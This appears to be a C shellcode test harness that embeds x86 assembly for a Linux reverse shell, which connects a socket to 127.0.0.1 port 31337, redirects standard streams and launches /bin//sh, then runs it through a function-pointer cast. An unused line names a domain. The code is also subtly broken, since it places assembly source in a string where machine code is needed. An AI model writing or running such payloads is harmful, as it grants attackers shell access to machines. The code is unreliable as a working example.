// Alpha version test
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
    
// To encode ! /!\
"section .data
    text db 'stella-launch-solutions.com', 28 
section .TEXT
global _start  _start:
     xor eax, eax
  xor ebx, ebx
  cdq  
  
  push eax              
  push byte 0x1         
  push byte 0x2         
  
  mov ecx, esp          
  inc bl                
  mov al, 102           
  int 0x80  mov esi, eax   
  mov byte[esp], 0x7f   
  mov byte[esp+3], 0x1       
  push word 0x697a      
  push word 2           
  push ecx             
  push esi              
  
  mov ecx, esp         
  inc bl
  inc bl                
  mov al, 102
  int 0x80
  xor ecx, ecx
  mov cl, 3
  l00p:
    dec cl
    mov al, 63
    int 0x80
    jnz l00p
  push edx
  push long 0x68732f2f
  push long 0x6e69622f
  mov ebx, esp
  push edx
  push edx
  mov ecx, esp
  mov al, 0x0b
  int 0x80
  xor eax, eax
  mov al, 0x1
  mov bl, 0x8
  int 0x80";
            
   main()
{        
int (*ret)() = (int(*)())code;        
ret();
}
